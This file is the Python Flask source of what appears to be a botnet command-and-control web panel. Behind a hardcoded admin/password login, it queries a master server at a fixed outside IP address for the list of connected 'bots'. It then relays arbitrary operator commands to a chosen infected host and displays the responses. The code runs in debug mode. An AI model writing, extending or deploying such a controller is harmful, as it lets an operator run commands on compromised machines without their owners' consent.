#!/usr/bin/env python

from flask import Flask
from flask import Flask, flash, redirect, render_template, request, session, abort, url_for
import os
import socket
import sys

app = Flask(__name__)

@app.route('/')
def home():
    if not session.get('logged_in'):
        return render_template('login.html')
    else:
        return redirect(url_for('main_activity'))
 
@app.route('/login', methods=['POST'])
def login():
    if request.form['password'] == 'password' and request.form['username'] == 'admin':
        session['logged_in'] = True
        return redirect(url_for('main_activity'))
    else:
        return redirect(url_for('home'))

#This is the main activity page, get all bots connected to the main server#
@app.route('/main_activity', methods=['GET','POST'])
def main_activity():
    if request.method == 'POST':
        if request.form['submit'] == 'ACCESS':
            req = request.form.get('access')
            print(req, file=sys.stdout)
            return redirect(url_for('user_activity', ip = req))
    if request.method == 'GET':
        if not session.get('logged_in'):
            return redirect(url_for('home'))
        else: 
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("167.99.194.11",8080))
            sock.send('null*ip_list:null'.encode('utf-8'))
            data_b = sock.recv(4096)
            sock.close()
            print(data_b)
            data = data_b.decode('utf-8')
            ip_list = data.split(':')
            print('[DEBUG] Bots connected [%s]' %ip_list, file=sys.stdout)
            return render_template('main_activity.html', data = ip_list)

#User activity, get information from the bot you are connected
@app.route('/user_activity/<ip>', methods=['POST', 'GET'])
def user_activity(ip, cmd_response=None):
    if request.method == 'POST':
        if request.form['submit'] == 'SEND COMMAND':
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("167.99.194.11", 8080))
            cmd = request.form['text']
            if cmd == '':
                return render_template('user_activity.html', ip = ip)
            host = request.form.get("host")
            msg = ":".join(['CMD', cmd])
            srv_msg = "*".join([host, msg])
            sock.send(srv_msg.encode('utf-8'))
            print("[DEBUG] Message for server %s for host %s" %(msg, host), file=sys.stdout)
            resp = sock.recv(4096)
            sock.close()
            resp = resp.decode('utf-8')
            print("[DEBUG] Response from Master Server: %s" %resp)
            p_resp = resp.split(':')
            if p_resp[0] == 'CMD':     
                return render_template('user_activity.html', ip = ip, cmd_response = p_resp[1])
            else:
                #TODO other action
                print('WTF', file=sys.stdout)
        elif request.form['submit'] == '<--':
            return redirect(url_for('main_activity'))

    elif request.method == 'GET':
        return render_template('user_activity.html', ip = ip)

if __name__ == "__main__":
    app.secret_key = os.urandom(12)
    app.debug=True
    app.run()
